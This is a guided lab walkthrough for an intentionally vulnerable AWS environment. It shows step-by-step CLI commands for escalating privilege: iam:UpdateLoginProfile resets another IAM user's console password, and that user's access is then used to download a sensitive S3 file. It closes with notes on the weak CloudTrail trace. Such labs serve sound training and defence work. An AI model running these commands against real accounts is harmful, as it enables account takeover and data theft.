# Guided Walkthrough: One-Hop Privilege Escalation via iam:UpdateLoginProfile (to-bucket)

This scenario demonstrates a privilege escalation vulnerability where a user has permission to update the login profile (console password) of another user with S3 bucket access. Unlike paths that target administrative privileges, this scenario focuses on data exfiltration — showing that privilege escalation to sensitive data access can be just as critical as gaining admin rights.

The attacker modifies the console password for a user with S3 bucket access permissions, logs into the AWS console with the new credentials, and directly accesses sensitive data stored in S3. This path demonstrates that not all privilege escalation leads to admin access, yet the impact can be equally severe when sensitive data is the target.

The `iam:UpdateLoginProfile` API was designed to let administrators reset console passwords for users in their organization. When this permission is scoped too broadly — or granted to a principal that should not have administrative authority over other users — it becomes a reliable credential-access primitive that bypasses the need to touch access keys at all.

## The Challenge

You start as `pl-prod-iam-006-to-bucket-starting-user`, an IAM user whose credentials are provided via Terraform outputs. Your goal is to read the contents of the `pl-prod-iam-006-to-bucket-sensitive-data-{account_id}` S3 bucket.

The starting user cannot access the S3 bucket directly. However, it holds `iam:UpdateLoginProfile` on `pl-prod-iam-006-to-bucket-user` — an IAM user that *can* read from that bucket and already has a console login profile. Your task is to exploit that permission to gain access.

## Reconnaissance

First, verify who you are and that your credentials are working:

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

You should see the ARN for `pl-prod-iam-006-to-bucket-starting-user`. Good — you have a foothold.

Now let's enumerate users to find interesting targets. The helpful `iam:ListUsers` and `iam:GetLoginProfile` permissions let you identify which users have console login profiles:

```bash
# List all IAM users
aws iam list-users --query 'Users[*].UserName' --output text

# Check whether the target user has a login profile
aws iam get-login-profile --user-name pl-prod-iam-006-to-bucket-user
```

If `GetLoginProfile` returns a result (rather than a `NoSuchEntity` error), the user has an active console login profile. That means the account can authenticate to the AWS Management Console — you just need to know (or set) the password.

Confirm that the starting user cannot reach the sensitive bucket:

```bash
aws s3 ls s3://pl-prod-iam-006-to-bucket-sensitive-data-{account_id}/
```

This should return an `AccessDenied` error. The data is there, but not for you — not yet.

## Exploitation

Now for the key move. You have `iam:UpdateLoginProfile` on the target user. This API call lets you set a new console password for any IAM user that already has a login profile, without knowing the current password:

```bash
aws iam update-login-profile \
  --user-name pl-prod-iam-006-to-bucket-user \
  --password 'PathfindingLabs123!abcd1234' \
  --no-password-reset-required
```

A successful response (HTTP 200, no output) means the password has been changed. The target user's console credentials are now under your control.

Collect the information you need to log in:

```bash
# Get your account ID for the console URL
aws sts get-caller-identity --query 'Account' --output text
```

The console sign-in URL for IAM users is:

```
https://{account_id}.signin.aws.amazon.com/console
```

## Verification

Open the console sign-in URL in a browser (or use a separate CLI profile), authenticate as `pl-prod-iam-006-to-bucket-user` with the password you just set, and navigate to S3.

Alternatively, generate temporary credentials via the console session and verify programmatically:

```bash
# Using the bucket user's new credentials
export AWS_ACCESS_KEY_ID="<bucket_user_access_key>"  # if access keys exist
export AWS_SECRET_ACCESS_KEY="<bucket_user_secret_key>"
unset AWS_SESSION_TOKEN

aws s3 ls s3://pl-prod-iam-006-to-bucket-sensitive-data-{account_id}/
aws s3 cp s3://pl-prod-iam-006-to-bucket-sensitive-data-{account_id}/sensitive-data.txt .
cat sensitive-data.txt
```

If you can list objects and download `sensitive-data.txt`, the escalation is complete.

## What Happened

You exploited an overly permissive `iam:UpdateLoginProfile` grant. The starting user was never intended to have administrative authority over other users, but the policy scoping allowed it to reset the console password for any user in a specific namespace — including one with sensitive data access.

In a real environment this technique is particularly dangerous because it leaves no obvious trace: no new access keys are created, no role policies are modified. The only CloudTrail evidence is a single `UpdateLoginProfile` event, which is easy to miss in noisy environments. The attacker then authenticates through the normal console login flow, blending in with legitimate user activity.

This scenario illustrates that privilege escalation analysis must account for paths to sensitive *data*, not just paths to administrative roles. A user who can read your most sensitive S3 bucket is, for practical purposes, a highly privileged principal — even if their IAM policies never say "admin."
